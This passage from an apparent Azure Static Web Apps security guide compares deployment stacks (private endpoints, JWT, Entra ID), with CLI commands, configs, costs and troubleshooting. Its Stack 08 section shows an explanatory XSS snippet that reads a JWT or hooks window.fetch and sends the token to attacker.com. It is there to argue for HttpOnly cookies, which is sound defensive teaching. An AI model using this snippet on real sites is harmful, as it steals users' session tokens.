# Optionally disable default SWA domain
# (custom domain only, additional security)
# Must configure custom domain first
```

**Testing:**

```bash
# Frontend works normally (via SWA)
open https://private.publiccloudexperiments.net
# Login, app functions normally

# Try to access function app directly
curl https://func-subnet-calc-private.azurewebsites.net/api/v1/health
# Returns: Connection timeout or empty response
# NO PUBLIC ENDPOINT EXISTS

# Verify private endpoint IP
az network private-endpoint show \
 --name pe-func-subnet-calc \
 --resource-group rg-subnet-calc \
 --query "customDnsConfigs[0].ipAddresses[0]" -o tsv
# Returns: 10.0.2.4 (private IP only)
```

**Cost Breakdown:**

- SWA Standard: ~$9/month
- Premium Function Plan (EP1): ~$100/month
- Private Endpoint: ~$10/month
- VNet: $0 (free)
- **Total: ~$129/month**

**Why So Expensive:**

- Premium function plan required for VNet integration
- Consumption plan does NOT support VNet integration
- Can't use free tier for this level of security

**Cost Optimization:**

- Use only when compliance absolutely requires it
- Consider Stack 06 (IP restrictions) for lower cost
- Deploy/destroy as needed (not 24/7)

**When to Use:**

- Healthcare data (HIPAA compliance)
- Financial services (PCI DSS)
- Government (data sovereignty mandates)
- Zero trust architecture requirements
- Maximum security posture required

**When NOT to Use:**

- Cost-sensitive projects ($129/month vs $9/month)
- Simple applications
- Internal tools (less risk)

**Compliance Benefits:**

- No public internet exposure for backend
- Data physically locked in specified region (uksouth)
- Network traffic stays within Azure backbone
- Defense against DDoS (no public endpoint)
- Audit trail (all access via SWA logs)

---

### Stack 08: JWT Token Authentication

**Architecture:**

```txt
User → Login Form (username/password)
 ↓
 SWA (no platform auth)
 └── Calls → Function App (JWT auth)
 └── Bearer token in header
```

**Purpose:**

- Demonstrate traditional application-level authentication
- Compare with platform authentication (Entra ID)
- Show tokens visible in JavaScript (security consideration)

**Data Sovereignty:**

- UK compliant (function app in uksouth)

**What's Secured:**

- API endpoints (JWT token required)
- Frontend static files (publicly accessible HTML)

**What's NOT Secured:**

- Frontend HTML/CSS/JS (anyone can view source)
- Tokens visible to JavaScript (XSS risk)

**Configuration:**

**Function App (JWT enabled):**

```python
# Already implemented in api-fastapi-azure-function
# Key components:
# - /api/v1/auth/login endpoint
# - JWT token generation
# - Token validation middleware
# - Password hashing (Argon2)
```

**Frontend (Token Management):**

```typescript
// auth.ts - TokenManager class
// Handles:
// - Login to API
// - Token caching (memory, not LocalStorage for better security)
// - Token refresh
// - Authorization headers

// config.ts
export const API_CONFIG = {
 auth: {
 enabled: true, // Enable JWT auth
 username: "demo",
 password: "demo-password",
 },
};
```

**Deployment:**

```bash
# Prerequisites
export LOCATION=uksouth

# Run stack deployment
./stack-08-swa-typescript-jwt.sh

# Key steps:
# 1. Create function app in uksouth
# 2. Deploy function code with JWT auth enabled
# 3. Create SWA (Standard tier)
# 4. Deploy frontend with auth enabled
# VITE_AUTH_ENABLED=true
# VITE_JWT_USERNAME=demo
# VITE_JWT_PASSWORD=demo-password
```

**Browser Dev Tools:**

- URL: `https://func-subnet-calc-jwt.azurewebsites.net/api/v1/health`
- Headers: `Authorization: Bearer eyJhbGciOiJIUzI1NiIs...`
- Token visible in Network tab
- Token stored in JavaScript memory (can be extracted)

**Authentication Flow:**

```txt
1. Page loads → No auth yet
1. Check API health → 401 Unauthorized
1. TokenManager automatically logs in:
 POST /api/v1/auth/login
 Body: username=demo&password=demo-password
 Response: {"access_token": "eyJ...", "token_type": "bearer"}
1. Store token in memory
1. Subsequent requests:
 GET /api/v1/health
 Header: Authorization: Bearer eyJ...
1. Token expires after 30 minutes
1. TokenManager automatically refreshes (login again)
```

**Testing:**

```bash
# Frontend loads (static files public)
open https://jwt.publiccloudexperiments.net
# No login page (auto-login happens in JavaScript)

# Open browser dev tools → Network tab
# See login request:
POST https://func-subnet-calc-jwt.azurewebsites.net/api/v1/auth/login
# username=demo&password=demo-password

# See token in response:
# {"access_token": "eyJ...", "token_type": "bearer"}

# See subsequent requests with token:
GET https://func-subnet-calc-jwt.azurewebsites.net/api/v1/health
# Authorization: Bearer eyJ...

# Try to call API without token
curl https://func-subnet-calc-jwt.azurewebsites.net/api/v1/health
# Returns: 401 Unauthorized (no token)

# Try to call API with valid token
TOKEN="eyJ..." # Copy from browser
curl -H "Authorization: Bearer ${TOKEN}" \
 https://func-subnet-calc-jwt.azurewebsites.net/api/v1/health
# Returns: {"status": "healthy", ...}
```

#### Security Comparison: JWT vs Platform Auth

| Feature | JWT (Application) | Entra ID (Platform) |
| ----------------------- | --------------------------------- | ---------------------------- |
| **Token storage** | JavaScript memory or LocalStorage | HttpOnly cookies |
| **Token visibility** | Visible in dev tools | Hidden from JavaScript |
| **XSS risk** | High (can extract token) | Low (HttpOnly cookie) |
| **CSRF protection** | Manual (CSRF tokens needed) | Automatic (SameSite cookies) |
| **Token refresh** | Manual code | Automatic |
| **User management** | Application database | Entra ID (enterprise) |
| **Password management** | You hash/store passwords | Microsoft manages |
| **Multi-factor auth** | You implement | Entra ID provides |
| **SSO** | You implement | Entra ID provides |
| **Audit logs** | You implement | Entra ID provides |
| **Cost** | Development time | $0 (included) |

**XSS Attack Scenario:**

```javascript
// Attacker injects malicious script via XSS vulnerability
// Can steal JWT token from memory or LocalStorage

// In console or injected script:
// If using LocalStorage (BAD):
const token = localStorage.getItem("jwt_token");
fetch("https://attacker.com/steal?token=" + token);

// If using memory (BETTER, but still vulnerable):
// Can intercept fetch calls or hook into TokenManager
const originalFetch = window.fetch;
window.fetch = function (...args) {
 const headers = args[1]?.headers || {};
 const authHeader = headers["Authorization"];
 if (authHeader) {
 fetch("https://attacker.com/steal?token=" + authHeader);
 }
 return originalFetch.apply(this, args);
};
```

**Platform Auth (Entra ID) Protection:**

```javascript
// With Entra ID, auth cookie is HttpOnly
// JavaScript cannot access it
document.cookie; // Auth cookie NOT visible
// "other-cookies=value" (but not .AspNetCore.Cookies)

// Even with XSS, attacker cannot steal auth cookie
// Can only make requests on same domain
// (still harmful, but more limited)
```

**When to Use:**

- Need custom authentication (not enterprise SSO)
- Multi-platform app (mobile apps, desktop apps, not just web)
- Want full control over auth flow
- Legacy system integration
- Username/password preferred over enterprise SSO

**When NOT to Use:**

- Enterprise application (use Entra ID)
- Want best security (platform auth is more secure)
- Don't want to implement password management
- Want SSO or MFA (Entra ID provides these)

---

### Stack 09: Managed Functions + Entra ID

**Architecture:**

```txt
User → Entra ID Login
 ↓
 SWA (Entra ID protected)
 └── /api/* → Managed Functions (westeurope, SWA-controlled)
```

**Purpose:**

- Combine managed functions (simplicity) with Entra ID (security)
- Show complete managed approach
- Compare managed+auth vs BYO+auth

**Data Sovereignty:**

- NOT UK compliant (westeurope, not uksouth)
- EU compliant (westeurope is in EU)

**What's Secured:**

- Frontend (Entra ID)
- API via SWA `/api/*` route (Entra ID)

**Configuration:**

**staticwebapp.config.json:**

```json
{
 "$schema": "https://json.schemastore.org/staticwebapp.config.json",
 "routes": [
 {
 "route": "/*",
 "allowedRoles": ["authenticated"]
 }
 ],
 "navigationFallback": {
 "rewrite": "/index.html",
 "exclude": ["/api/*", "/*.{css,scss,js,png,gif,ico,jpg,svg}"]
 },
 "responseOverrides": {
 "401": {
 "statusCode": 302,
 "redirect": "/.auth/login/aad"
 }
 },
 "auth": {
 "identityProviders": {
 "azureActiveDirectory": {
 "registration": {
 "openIdIssuer": "https://login.microsoftonline.com/AZURE_TENANT_ID/v2.0",
 "clientIdSettingName": "AZURE_CLIENT_ID",
 "clientSecretSettingName": "AZURE_CLIENT_SECRET"
 }
 }
 }
 },
 "globalHeaders": {
 "cache-control": "no-cache, no-store, must-revalidate"
 }
}
```

**Deployment:**

```bash
# Prerequisites
export AZURE_CLIENT_ID="your-app-id"
export AZURE_CLIENT_SECRET="your-secret"

# Run stack deployment
./stack-09-swa-typescript-managed-auth.sh

# Key steps:
# 1. Create SWA in westeurope (managed functions region)
# 2. Configure Entra ID on SWA
# 3. Deploy with managed functions
# - Frontend: dist/
# - API: api-fastapi-azure-function/
# 4. SWA deploys both automatically
```

**Deployment Command:**

```bash
# Create SWA
az staticwebapp create \
 --name swa-subnet-calc-managed-auth \
 --resource-group rg-subnet-calc \
 --location westeurope \
 --sku Standard

# Configure Entra ID
az staticwebapp appsettings set \
 --name swa-subnet-calc-managed-auth \
 --resource-group rg-subnet-calc \
 --setting-names \
 AZURE_CLIENT_ID="${AZURE_CLIENT_ID}" \
 AZURE_CLIENT_SECRET="${AZURE_CLIENT_SECRET}"

# Build frontend
cd frontend-typescript-vite
VITE_API_URL="" bun run build

# Copy auth config
cp staticwebapp-entraid.config.json dist/

# Deploy both frontend and API
bun x @azure/static-web-apps-cli deploy \
 --app-location dist \
 --api-location ../api-fastapi-azure-function \
 --deployment-token "${DEPLOYMENT_TOKEN}" \
 --env production
```

**Browser Dev Tools:**

- URL: `/api/v1/health` (same domain, relative)
- Headers: Cookie (HttpOnly, SWA auth)
- CORS: No (same-origin)
- Login page: Entra ID

**Testing:**

```bash
# Requires login
open https://managed-auth.publiccloudexperiments.net
# Redirects to Entra ID login

# After login, app works
# API calls are same-origin (/api/v1/health)
# No CORS issues
# HttpOnly cookies (secure)

# Cannot access API directly (no separate function app URL)
# Functions are embedded in SWA
```

**Comparison with Stack 05b:**

| Feature | Stack 09 (Managed) | Stack 05b (BYO Linked) |
| ----------------------- | ------------------- | -------------------------- |
| **Deployment** | Automatic (SWA CLI) | Manual (separate function) |
| **Region** | westeurope (fixed) | uksouth (your choice) |
| **Function visibility** | Embedded in SWA | Separate function app |
| **Logs** | Limited | Full Application Insights |
| **VNet** | No | Yes (with Premium) |
| **Cost** | $9/month | $9/month |
| **UK sovereignty** | No | Yes |
| **EU sovereignty** | Yes | Yes |

**When to Use:**

- EU-based application (westeurope is fine)
- Want simplest deployment (GitHub Actions)
- Don't need advanced networking
- Team prefers automated deployment
- Don't need detailed function app logs

**When NOT to Use:**

- UK data sovereignty required
- Need VNet integration
- Need Premium function features
- Want full control over function app

---

## Comparison Tables

### Complete Stack Comparison

| Stack | Functions | Region | Auth | Sovereignty | Bypass | Cost | Use Case |
| ----------------------- | ----------- | ---------- | ------------ | ----------- | --------- | ---- | ---------------- |
| **03: No Auth** | BYO | uksouth | None | UK | Yes | $9 | Public demo |
| **04: Managed** | Managed | westeurope | None | UK / EU | Yes | $9 | Simple EU app |
| **05a: Entra Frontend** | BYO | uksouth | Entra (SWA) | UK | Yes | $9 | Protect content |
| **05b: Entra Linked** | BYO | uksouth | Entra (SWA) | UK | Partial | $9 | **Recommended** |
| **05c: Double Auth** | BYO | uksouth | Entra (both) | UK | No | $9 | Max security |
| **06: Network Secured** | BYO | uksouth | Entra + IP | UK | Difficult | $9 | Defense depth |
| **07: Fully Private** | BYO Premium | uksouth | Entra + VNet | UK | No | $129 | Compliance |
| **08: JWT** | BYO | uksouth | JWT | UK | No | $9 | Custom auth |
| **09: Managed + Auth** | Managed | westeurope | Entra (SWA) | UK / EU | No | $9 | Simple EU + auth |

### Browser Dev Tools Comparison

| Stack | API URL in Browser | Auth Header | Same-Origin | CORS | Login Flow |
| ----- | ------------------------------------------------ | ------------------------ | ----------- | ---- | --------------- |
| 03 | `https://func-*.azurewebsites.net/api/v1/health` | None | No | Yes | None |
| 04 | `/api/v1/health` | None | Yes | No | None |
| 05a | `https://func-*.azurewebsites.net/api/v1/health` | None | No | Yes | Entra ID |
| 05b | `/api/v1/health` | Cookie (HttpOnly) | Yes | No | Entra ID |
| 05c | `https://func-*.azurewebsites.net/api/v1/health` | Cookie + possibly Bearer | No | Yes | Entra ID (dual) |
| 06 | `https://func-*.azurewebsites.net/api/v1/health` | Cookie | No | Yes | Entra ID |
| 07 | `/api/v1/health` | Cookie (HttpOnly) | Yes | No | Entra ID |
| 08 | `https://func-*.azurewebsites.net/api/v1/health` | `Bearer eyJ...` | No | Yes | Form (auto) |
| 09 | `/api/v1/health` | Cookie (HttpOnly) | Yes | No | Entra ID |

### Security Features Comparison

| Stack | Frontend Protected | API Protected | Direct Bypass | Token Visibility | CSRF Protection |
| ----- | ------------------ | ---------------- | ------------- | ---------------- | --------------- |
| 03 | No | No | Yes | N/A | No |
| 04 | No | No | Yes | N/A | No |
| 05a | Entra ID | No | Yes | HttpOnly cookie | SameSite |
| 05b | Entra ID | Via SWA | Partial | HttpOnly cookie | SameSite |
| 05c | Entra ID | Yes | No | HttpOnly cookie | SameSite |
| 06 | Entra ID | IP + Header | Difficult | HttpOnly cookie | SameSite |
| 07 | Entra ID | Private endpoint | No | HttpOnly cookie | SameSite |
| 08 | No (public HTML) | JWT | No | Visible | Manual |
| 09 | Entra ID | Via SWA | No (embedded) | HttpOnly cookie | SameSite |

### Data Sovereignty Compliance

| Stack | UK Compliance | EU Compliance | Notes |
| ----- | ------------- | ------------- | ----------------------------- |
| 03 | Yes (uksouth) | Yes | Function in uksouth |
| 04 | No | Yes | Managed in westeurope |
| 05a | Yes (uksouth) | Yes | Function in uksouth |
| 05b | Yes (uksouth) | Yes | Function in uksouth |
| 05c | Yes (uksouth) | Yes | Function in uksouth |
| 06 | Yes (uksouth) | Yes | Function in uksouth |
| 07 | Maximum | Maximum | VNet in uksouth, private only |
| 08 | Yes (uksouth) | Yes | Function in uksouth |
| 09 | No | Yes | Managed in westeurope |

---

## Implementation Guide

### Prerequisites

#### 1. Entra ID App Registration

Required for: Stacks 05a, 05b, 05c, 06, 07, 09

**Create App Registration:**

```bash
# Via Azure CLI
az ad app create \
 --display-name "Subnet Calculator SWA" \
 --sign-in-audience AzureADMyOrg \
 --web-redirect-uris \
 "https://swa-subnet-calc-entraid-frontend.azurestaticapps.net/.auth/login/aad/callback" \
 "https://swa-subnet-calc-entraid-linked.azurestaticapps.net/.auth/login/aad/callback" \
 "https://entraid-frontend.publiccloudexperiments.net/.auth/login/aad/callback" \
 "https://entraid-linked.publiccloudexperiments.net/.auth/login/aad/callback"

# Save the application ID
APP_ID=$(az ad app list --display-name "Subnet Calculator SWA" --query "[0].appId" -o tsv)
export AZURE_CLIENT_ID="${APP_ID}"

# Create client secret
SECRET=$(az ad app credential reset --id "${APP_ID}" --append --query password -o tsv)
export AZURE_CLIENT_SECRET="${SECRET}"

# Get tenant ID
export TENANT_ID=$(az account show --query tenantId -o tsv)
```

**Or via Azure Portal:**

1. Navigate to Entra ID → App registrations
1. Click "New registration"
1. Name: "Subnet Calculator SWA"
1. Supported account types: Single tenant
1. Redirect URI: Web → `https://your-swa.azurestaticapps.net/.auth/login/aad/callback`
1. Click "Register"
1. Note the "Application (client) ID"
1. Go to "Certificates & secrets" → "New client secret"
1. Description: "SWA Secret"
1. Expires: 24 months
1. Click "Add"
1. Copy the secret value immediately

**Save Credentials:**

```bash
# Add to ~/.bashrc or ~/.zshrc
export AZURE_CLIENT_ID="your-app-id"
export AZURE_CLIENT_SECRET="your-secret"
export TENANT_ID="your-tenant-id"
```

#### 2. Azure Tools

**Required:**

- Azure CLI: `brew install azure-cli`
- Azure Functions Core Tools: `brew install azure-functions-core-tools`
- Azure Static Web Apps CLI: `bun add -g @azure/static-web-apps-cli`

**Verify:**

```bash
az --version
func --version
swa --version
```

**Login:**

```bash
az login
az account show
```

#### 3. Development Tools

**Required:**

- Node.js 18+: `brew install node`
- Python 3.11: `brew install python@3.11`
- uv (Python package manager): `brew install uv`

**Frontend Dependencies:**

```bash
cd frontend-typescript-vite
bun install
```

**Backend Dependencies:**

```bash
cd api-fastapi-azure-function
uv sync --extra dev
```

### Region Selection

**Determine Your Requirements:**

| Requirement | Deploy To | Managed Functions? |
| ------------------- | ------------------------- | ----------------------- |
| UK data sovereignty | uksouth | No (use BYO) |
| EU data sovereignty | westeurope or uksouth | Yes (westeurope) or BYO |
| US data sovereignty | eastus, westus, centralus | Yes or BYO |
| Australia | australiaeast | No (use BYO) |
| Canada | canadacentral | No (use BYO) |

**Set Region:**

```bash
# For UK deployments
export LOCATION=uksouth

# For EU deployments (can use managed or BYO)
export LOCATION=westeurope

# Verify
echo $LOCATION
```

### Deployment Workflow

**General Pattern for All Stacks:**

1. **Choose Stack** (based on requirements)
1. **Set Environment Variables**

```bash
export RESOURCE_GROUP=rg-subnet-calc
export LOCATION=uksouth # Or your region
export AZURE_CLIENT_ID="..." # If using Entra ID
export AZURE_CLIENT_SECRET="..." # If using Entra ID
```

1. **Run Stack Script**

```bash
cd ~/Developer/personal/azure-tui/infrastructure/azure
./stack-XX-name.sh
```

1. **Verify Deployment**

```bash
# Check SWA
az staticwebapp show --name swa-name --resource-group rg-subnet-calc

# Check function app (if BYO)
az functionapp show --name func-name --resource-group rg-subnet-calc

# Test frontend
open https://your-swa.azurestaticapps.net

# Test API
curl https://your-swa.azurestaticapps.net/api/v1/health
```

### Verification Checklist

After deploying each stack:

- [ ] SWA created and accessible
- [ ] Function app in correct region (if BYO)
- [ ] Function app has correct plan (Consumption/Premium)
- [ ] Entra ID configured (if applicable)
- [ ] API linked to SWA (if applicable)
- [ ] Frontend deployed and loads
- [ ] API calls work from frontend
- [ ] Authentication works (if applicable)
- [ ] Direct API access blocked/allowed as expected
- [ ] Data sovereignty verified (function in correct region)

---

## Testing and Verification

### Test Plan Template

For each stack, follow this test plan:

#### 1. Frontend Access Test

**Without Authentication (Stacks 03, 04, 08):**

```bash
# Should load immediately
open https://stack-name.publiccloudexperiments.net
# Expected: Page loads, no login required
```

**With Authentication (Stacks 05a-07, 09):**

```bash
# Should redirect to login
open https://stack-name.publiccloudexperiments.net
# Expected: Redirects to Entra ID login page

# After login
# Expected: Frontend loads, authenticated session established
```

#### 2. API Access Test (via Frontend)

**Open Browser Dev Tools:**

1. Open browser (Chrome/Firefox)
1. Press F12 (open dev tools)
1. Navigate to Network tab
1. Clear network log
1. Enter CIDR: `10.0.0.0/24`
1. Click "Calculate"

**Observe:**

- What URL is called? (direct function URL vs `/api` route)
- Are there auth headers? (Cookie vs Bearer vs none)
- Is there CORS preflight? (OPTIONS request)
- Does the request succeed?

**Example Observations:**

**Stack 03 (No Auth):**

```txt
Request URL: https://func-subnet-calc-43825.azurewebsites.net/api/v1/health
Method: GET
Status: 200 OK
Request Headers:
 Accept: application/json
 (No Authorization header)
Response Headers:
 Content-Type: application/json
 Access-Control-Allow-Origin: *
```

**Stack 05b (Entra Linked):**

```txt
Request URL: /api/v1/health
Method: GET
Status: 200 OK
Request Headers:
 Accept: application/json
 Cookie: .AspNetCore.Cookies=CfDJ8...
Response Headers:
 Content-Type: application/json
 (No CORS headers - same origin)
```

**Stack 08 (JWT):**

```txt
Request URL: https://func-subnet-calc-jwt.azurewebsites.net/api/v1/health
Method: GET
Status: 200 OK
Request Headers:
 Accept: application/json
 Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Response Headers:
 Content-Type: application/json
 Access-Control-Allow-Origin: *
```

#### 3. Direct API Access Test (Bypass Attempt)

**Test Command:**

```bash
# Replace with your function app URL
FUNC_URL="https://func-subnet-calc-*.azurewebsites.net"

# Test health endpoint
curl "${FUNC_URL}/api/v1/health"

# Test actual API endpoint
curl -X POST "${FUNC_URL}/api/v1/ipv4/subnet-info" \
 -H "Content-Type: application/json" \
 -d '{"network":"10.0.0.0/24","mode":"simple"}'
```

**Expected Results:**

| Stack | Expected Response | Meaning |
| ----- | ---------------------- | ----------------------------------------------- |
| 03 | 200 OK (JSON response) | Public, bypass works |
| 04 | No function URL exists | Managed, embedded in SWA |
| 05a | 200 OK (JSON response) | Public API, bypass works |
| 05b | 200 OK (JSON response) | Public API, bypass works (but URL less visible) |
| 05c | 401 Unauthorized | Function app auth required, bypass blocked |
| 06 | 403 Forbidden | IP restriction, bypass blocked |
| 07 | Connection timeout | No public endpoint, bypass impossible |
| 08 | 401 Unauthorized | JWT required, bypass blocked |
| 09 | No function URL exists | Managed, embedded in SWA |

#### 4. Region Verification Test

**Verify Function App Region:**

```bash
az functionapp show \
 --name func-subnet-calc-* \
 --resource-group rg-subnet-calc \
 --query "{name:name, location:location, kind:kind}" -o table
```

**Expected:**

```txt
Name Location Kind
------------------------ -------- ---------------------
func-subnet-calc-linked uksouth functionapp,linux
```

**For Managed Functions (Stack 04, 09):**

```bash
# No separate function app to check
# API runs in SWA-managed infrastructure in westeurope
```

#### 5. Authentication Flow Test

**Entra ID Stacks (05a-07, 09):**

```bash
# Test in incognito window
open -a "Google Chrome" --args --incognito https://stack-url.com

# Steps:
# 1. Should redirect to login.microsoftonline.com
# 2. Enter credentials
# 3. Should redirect back to app
# 4. App should function normally

# Check auth status
curl https://stack-url.com/.auth/me
# Should show user info (if authenticated) or redirect to login
```

**JWT Stack (08):**

```bash
# Watch network tab during page load
# Should see:
# 1. POST to /api/v1/auth/login (automatic)
# 2. Response with access_token
# 3. Subsequent requests with Authorization header
```

### Demonstration Script

**For showing colleagues (side-by-side comparison):**

1. **Prepare Environment:**

- Open 2-3 browser windows (different stacks)
- Open dev tools in each (Network tab)
- Clear network logs

1. **Show Stack 03 (Baseline):**

- Navigate to Stack 03 URL
- No login required
- Submit CIDR: `10.0.0.0/24`
- Point out:
- Direct function URL in network tab
- No auth headers
- CORS preflight

1. **Show Stack 05b (Entra Linked):**

- Navigate to Stack 05b URL
- Login required (Entra ID)
- Submit same CIDR
- Point out:
- Relative `/api/` URL in network tab
- HttpOnly cookie (not visible to JavaScript)
- No CORS preflight (same-origin)

1. **Show Stack 08 (JWT):**

- Navigate to Stack 08 URL
- No login page (auto-login)
- Submit same CIDR
- Point out:
- Bearer token in network tab
- Token visible in JavaScript
- CORS preflight present

1. **Show Bypass Attempts:**

- Open terminal
- Try to curl each function app URL
- Show results:
- Stack 03: Works (public)
- Stack 05b: Works (but URL not obvious)
- Stack 08: Blocked (401)

1. **Discuss Trade-offs:**

- Simplicity vs Security
- Platform auth vs Application auth
- Same-origin vs Cross-origin
- HttpOnly cookies vs Visible tokens

---

## Real-World Scenarios

### Scenario 1: UK Healthcare Application

**Requirements:**

- Patient data must stay in UK
- HIPAA/GDPR compliance
- Zero public internet exposure for backend
- Enterprise SSO (NHS employees)

**Recommended Stack:** Stack 07 (Fully Private)

**Justification:**

- Function app in uksouth VNet (UK data sovereignty)
- Private endpoint only (no public access)
- Entra ID (enterprise SSO)
- Network isolation (compliance)
- Audit trail (SWA logs)

**Cost:** ~$129/month (worth it for compliance)

### Scenario 2: EU-Based Internal Tool

**Requirements:**

- EU data sovereignty (westeurope acceptable)
- Simple deployment (GitHub Actions)
- Enterprise SSO (company employees)
- Limited technical team

**Recommended Stack:** Stack 09 (Managed + Entra ID)

**Justification:**

- Managed functions in westeurope (EU compliant)
- Automatic deployment (GitHub Actions)
- Entra ID (enterprise SSO)
- Minimal management overhead
- Cost-effective ($9/month)

**Cost:** $9/month

### Scenario 3: Public Documentation Site with Restricted Access

**Requirements:**

- Frontend content should be protected (login required)
- API can be public (documentation examples)
- Cost-effective
- Simple setup

**Recommended Stack:** Stack 05a (Entra Frontend Only)

**Justification:**

- Frontend protected (Entra ID)
- API public (acceptable for docs)
- Cost-effective ($9/month)
- Simple deployment

**Alternative:** If API should also be protected, use Stack 05b

### Scenario 4: Multi-Platform Application

**Requirements:**

- Web frontend (SWA)
- Mobile apps (iOS, Android)
- Desktop app
- Custom authentication (not enterprise)

**Recommended Stack:** Stack 08 (JWT)

**Justification:**

- JWT works across all platforms
- Single auth mechanism
- Custom user management
- API protected

**Note:** Consider Stack 05c with Entra ID if enterprise SSO is acceptable

### Scenario 5: Compliance-Required with Budget Constraints

**Requirements:**

- UK data sovereignty
- Defense-in-depth security
- Limited budget (~$10/month)
- Enterprise SSO

**Recommended Stack:** Stack 06 (Network Secured)

**Justification:**

- Function in uksouth (UK compliant)
- IP restrictions (network security)
- Header validation (additional layer)
- Entra ID (enterprise SSO)
- Cost-effective ($9/month vs $129)

**Trade-off:** Not as secure as Stack 07, but good balance

---

## Troubleshooting

### Issue: "SWA trying to deploy managed functions to westeurope"

**Symptoms:**

- Deployment mentions westeurope even though you want uksouth
- Function code being deployed to SWA

**Cause:**

- `api_location` is NOT empty in deployment config

**Fix:**

```bash
# Check deployment command
# BAD:
swa deploy --api-location api # This deploys managed functions

# GOOD:
swa deploy --api-location "" # This uses BYO functions
```

**Verify:**

```bash
# After deployment, check SWA configuration
az staticwebapp show \
 --name swa-name \
 --resource-group rg-subnet-calc \
 --query "linkedBackends"

# Should show:
# - Empty (if not linked)
# - Your function app resource ID (if linked)
# - NOT "managed" or embedded functions
```

### Issue: "Function app running in wrong region"

**Symptoms:**

- Function app shows `location: westeurope` but you need uksouth

**Cause:**

- LOCATION environment variable not set during creation
- Or function app created in wrong region

**Fix:**

```bash
# Always set LOCATION before creating function app
export LOCATION=uksouth

# Verify before deployment
echo $LOCATION

# Check existing function app
az functionapp show \
 --name func-name \
 --resource-group rg-subnet-calc \
 --query location -o tsv

# If wrong, must delete and recreate
az functionapp delete --name func-name --resource-group rg-subnet-calc
LOCATION=uksouth ./10-function-app.sh
```

### Issue: "How do I know if functions are managed or BYO?"

#### Check Method 1: Azure Portal

```txt
1. Navigate to SWA → APIs
1. Look at "Production" row:
 - "Linked" = BYO functions
 - "Managed" = Managed functions
 - "Unlinked" = No backend configured
```

#### Check Method 2: Azure CLI

```bash
# Check for linked backends
az staticwebapp show \
 --name swa-name \
 --resource-group rg-subnet-calc \
 --query "linkedBackends" -o table

# If empty: Not linked
# If shows resource ID: BYO linked
# Managed functions don't show in linkedBackends
```

#### Check Method 3: Function App List

```bash
# List all function apps
az functionapp list \
 --resource-group rg-subnet-calc \
 --query "[].[name,location]" -o table

# If you see a function app: BYO
# If no function app: Managed (embedded in SWA)
```

### Issue: "Authentication not working after deployment"

**Symptoms:**

- Entra ID login page doesn't appear
- Or login fails with error

#### Cause 1: Client ID/Secret not configured

```bash
# Check SWA app settings
az staticwebapp appsettings list \
 --name swa-name \
 --resource-group rg-subnet-calc

# Should include:
# AZURE_CLIENT_ID: "..."
# AZURE_CLIENT_SECRET: "..."

# If missing, add them:
az staticwebapp appsettings set \
 --name swa-name \
 --resource-group rg-subnet-calc \
 --setting-names \
 AZURE_CLIENT_ID="${AZURE_CLIENT_ID}" \
 AZURE_CLIENT_SECRET="${AZURE_CLIENT_SECRET}"
```

#### Cause 2: Redirect URI not configured in Entra ID

```bash
# Check redirect URIs in app registration
az ad app show --id "${AZURE_CLIENT_ID}" --query "web.redirectUris"

# Should include:
# https://your-swa.azurestaticapps.net/.auth/login/aad/callback
# https://your-custom-domain.com/.auth/login/aad/callback

# Add if missing (via Portal or CLI)
```

#### Cause 3: staticwebapp.config.json not deployed

```bash
# Verify config file is in deployed dist folder
cd frontend-typescript-vite/dist
ls -la staticwebapp.config.json

# If missing, copy and redeploy:
cp ../staticwebapp-entraid.config.json dist/staticwebapp.config.json
swa deploy ...
```

### Issue: "API calls returning 403 Forbidden (Stack 06)"

**Symptoms:**

- Frontend can't access API
- 403 Forbidden errors

#### Cause 1: IP restrictions too strict

```bash
# Check current IP restrictions
az functionapp config access-restriction show \
 --name func-name \
 --resource-group rg-subnet-calc

# Temporarily allow all to test
az functionapp config access-restriction remove \
 --name func-name \
 --resource-group rg-subnet-calc \
 --rule-name "Deny-All"

# Test if it works now
# If yes, IP restriction was too strict
```

#### Cause 2: Header validation failing

```bash
# Check function app logs
az functionapp log tail \
 --name func-name \
 --resource-group rg-subnet-calc

# Look for:
# "Forbidden: Invalid origin"

# Check X-Forwarded-Host header in requests
# May need to adjust ALLOWED_ORIGINS in function code
```

### Issue: "VNet deployment failing (Stack 07)"

**Symptoms:**

- Private endpoint creation fails
- VNet integration fails

#### Cause 1: Premium plan required

```bash
# Check function app plan
az functionapp show \
 --name func-name \
 --resource-group rg-subnet-calc \
 --query "serverFarmId" -o tsv

# Get plan details
az functionapp plan show \
 --id "plan-resource-id" \
 --query "sku.tier" -o tsv

# Should output: ElasticPremium or PremiumV2/V3
# If "Dynamic": Consumption plan, VNet not supported

# Must upgrade to Premium
```

#### Cause 2: Subnet not configured for private endpoints

```bash
# Check subnet configuration
az network vnet subnet show \
 --name snet-private-endpoints \
 --resource-group rg-subnet-calc \
 --vnet-name vnet-name \
 --query "privateEndpointNetworkPolicies"

# Should output: Disabled

# If Enabled, fix:
az network vnet subnet update \
 --name snet-private-endpoints \
 --resource-group rg-subnet-calc \
 --vnet-name vnet-name \
 --disable-private-endpoint-network-policies
```

### Issue: "JWT token not working (Stack 08)"

**Symptoms:**

- Login fails
- Token not sent with requests

#### Cause 1: Auth not enabled in frontend

```bash
# Check build configuration
# Should have been built with:
VITE_AUTH_ENABLED=true bun run build

# Check deployed config
# In browser console:
console.log(API_CONFIG.auth.enabled)
# Should output: true
```

#### Cause 2: Function app auth not deployed

```bash
# Check function app has auth endpoints
curl https://func-name.azurewebsites.net/api/v1/auth/login
# Should return: 405 Method Not Allowed (expects POST, not GET)

# If 404: Auth endpoints not deployed
# Redeploy with auth enabled:
export ENABLE_AUTH=true
./22-deploy-function-zip.sh
```

---

## Cost Analysis

### Monthly Cost Breakdown

| Stack | SWA | Function Plan | Networking | Other | Total/Month |
| ----- | --- | ------------------- | ---------- | ---------- | ----------- |
| 03 | $9 | $0 (free tier) | $0 | $0 | $9 |
| 04 | $9 | $0 (managed) | $0 | $0 | $9 |
| 05a | $9 | $0 (free tier) | $0 | $0 | $9 |
| 05b | $9 | $0 (free tier) | $0 | $0 | $9 |
| 05c | $9 | $0 (free tier) | $0 | $0 | $9 |
| 06 | $9 | $0 (free tier) | $0 | $0 | $9 |
| 07 | $9 | ~$100 (Premium EP1) | ~$10 (PE) | ~$10 (DNS) | ~$129 |
| 08 | $9 | $0 (free tier) | $0 | $0 | $9 |
| 09 | $9 | $0 (managed) | $0 | $0 | $9 |

**Notes:**

- SWA Standard tier: ~$9/month ($0.007/hour = ~$5.04/month + ~$4/month for bandwidth)
